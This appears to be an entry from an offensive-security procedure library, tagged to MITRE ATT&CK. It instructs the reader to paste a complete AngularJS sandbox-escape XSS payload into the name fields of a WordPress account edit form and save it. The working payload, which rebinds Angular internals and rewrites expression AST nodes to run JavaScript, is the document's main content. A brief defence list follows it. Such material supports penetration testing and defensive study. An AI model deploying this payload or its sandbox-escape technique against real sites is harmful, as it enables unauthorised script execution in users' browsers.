---
id: proc-222224-inject-payload
tags:
  - xss
  - angularjs
  - sandbox-bypass
  - payload-injection
type: procedure
tools:
  - '[[tools/Chrome]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:30.744Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-AngularJS-Sandbox-Bypass-Payload

## Summary

This procedure injects a crafted AngularJS payload into the First Name and Last Name fields of the WordPress account edit form, bypassing sandbox restrictions to enable self-XSS execution.

## Description

The payload manipulates AngularJS internals like $apply, $eval, and AST nodes to escape sandbox controls, storing the expression in the user's profile. Upon re-rendering, it executes JavaScript, but only in the injector's browser session. Targets WordPress sites with AngularJS forms lacking edit-time validation.

## Requirements

1. Access to edit form via prior steps
2. [[tools/Chrome]] for payload pasting
3. Knowledge of AngularJS sandbox mechanics

## Defense

Defensive measures and detection strategies:

- Sanitize all form inputs with allowlists
- Disable or upgrade AngularJS to patched versions
- Monitor for anomalous JavaScript in stored data

## Objectives

1. Bypass input restrictions absent in edit mode
2. Store executable AngularJS expression
3. Set up for self-XSS trigger

## Instructions

### Step 1: Prepare Payload

**Context**: Copy the bypass payload for injection.

Use this exact payload: `{{ c=''.sub.call;b=''.sub.bind;a=''.sub.apply; c.$apply=$apply;c.$eval=b;op=$root.$$phase; $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString; C=c.$apply(c);$root.$$phase=op;$root.$digest=od; B=C(b,c,b);$evalAsync(" astNode=pop();astNode.type='UnaryExpression'; astNode.operator='(window.X?void0:(window.X=true,prompt(document.domain)))+'; astNode.argument={type:'Identifier',name:'foo'}; "); m1=B($$asyncQueue.pop().expression,null,$root); m2=B(C,null,m1);[].push.apply=m2;a=''.sub; $eval('a(b.c)');[].push.apply=a; }}`

> This rebinds functions and alters AST to inject prompt().

### Step 2: Inject and Save

**Context**: Place payload in vulnerable fields and persist it.

Paste the payload into both First Name and Last Name fields in the edit form, then submit.

> Submission succeeds without blocking the payload.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Chrome]]

## Tags

- xss
- angularjs
- sandbox-bypass
- payload-injection
